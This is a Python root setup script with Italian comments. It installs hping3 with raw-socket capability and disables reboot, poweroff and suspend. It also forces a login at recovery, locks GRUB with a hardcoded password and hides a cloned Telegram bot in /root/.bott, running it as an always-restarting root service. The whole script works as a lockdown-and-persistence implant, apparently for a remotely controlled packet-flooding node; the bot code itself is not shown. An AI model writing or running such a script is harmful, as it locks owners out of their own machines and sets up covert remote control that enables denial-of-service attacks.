#!/usr/bin/env python3
import os
import subprocess

def run(cmd):
    print(f"[+] {cmd}")
    subprocess.run(cmd, shell=True, check=False)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    exit(1)

# =============================
# 1. Install dipendenze
# =============================
run("apt update")
run("apt install -y hping3 git curl build-essential libssl-dev zlib1g-dev "
    "libncurses5-dev libffi-dev libreadline-dev python3-pexpect")

# =============================
# 2. setcap su hping3
# =============================
HPING = "/usr/sbin/hping3"
if os.path.exists(HPING):
    run(f"setcap cap_net_raw+ep {HPING}")

# =============================
# 3. PATH globale
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. Disabilita power / reboot / suspend
# =============================
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]

for t in targets:
    run(f"systemctl mask {t}")

logind = "/etc/systemd/logind.conf"
lines = []
if os.path.exists(logind):
    with open(logind, "r") as f:
        lines = f.readlines()

def set_conf(key, value):
    global lines
    for i, l in enumerate(lines):
        if l.strip().startswith(key):
            lines[i] = f"{key}={value}\n"
            return
    lines.append(f"{key}={value}\n")

set_conf("HandleRebootKey", "ignore")
set_conf("HandlePowerKey", "ignore")
set_conf("HandleSuspendKey", "ignore")
set_conf("KillUserProcesses", "no")

with open(logind, "w") as f:
    f.writelines(lines)

run("systemctl daemon-reexec")
run("systemctl restart systemd-logind")

# =============================
# 4.5 LOCK RECOVERY / EMERGENCY
# =============================
systemd_conf = "/etc/systemd/system.conf"
with open(systemd_conf, "a") as f:
    f.write("\n[Manager]\nDefaultEnvironment=SYSTEMD_SULOGIN_FORCE=1\n")

run("systemctl daemon-reexec")

# =============================
# 4.6 LOCK GRUB (AUTO – SENZA INPUT)
# =============================
GRUB_PASSWORD = "kali55757"
grub_custom = "/etc/grub.d/40_custom"

try:
    result = subprocess.run(
        f'echo -e "{GRUB_PASSWORD}\n{GRUB_PASSWORD}" | grub-mkpasswd-pbkdf2',
        shell=True,
        check=True,
        capture_output=True,
        text=True
    )
except subprocess.CalledProcessError as e:
    print("ERRORE: impossibile generare hash GRUB")
    print(e.stdout)
    print(e.stderr)
    exit(1)

# Estrai l'hash
hash_value = None
for line in result.stdout.splitlines():
    if "grub.pbkdf2" in line:
        hash_value = line.split()[-1]
        break

if not hash_value:
    print("ERRORE: impossibile trovare hash GRUB nell'output")
    exit(1)

# Scrivi su 40_custom
with open(grub_custom, "w") as f:
    f.write(f"""set superusers="root"
password_pbkdf2 root {hash_value}
""")

run("update-grub")

# =============================
# 5. Install Python 3.10
# =============================
run("cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz")
run("cd /usr/src && tar xzf Python-3.10.14.tgz")
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations")
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)")
run("cd /usr/src/Python-3.10.14 && make altinstall")

# =============================
# 6. pip + python-telegram-bot
# =============================
run("/usr/local/bin/python3.10 -m ensurepip")
run("/usr/local/bin/python3.10 -m pip install --upgrade pip")
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15")

# =============================
# 7. Clone bot
# =============================
run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

# =============================
# 7.1 Sposta in .bott + permessi
# =============================
if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 7.2 SYSTEMD SERVICE
# =============================
service_file = "/etc/systemd/system/bott.service"
with open(service_file, "w") as f:
    f.write("""[Unit]
Description=Telegram Bot Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott.service")
run("systemctl start bott.service")

print("\n[✓] SISTEMA LOCKATO + GRUB PROTETTO + BOT AUTO-START")
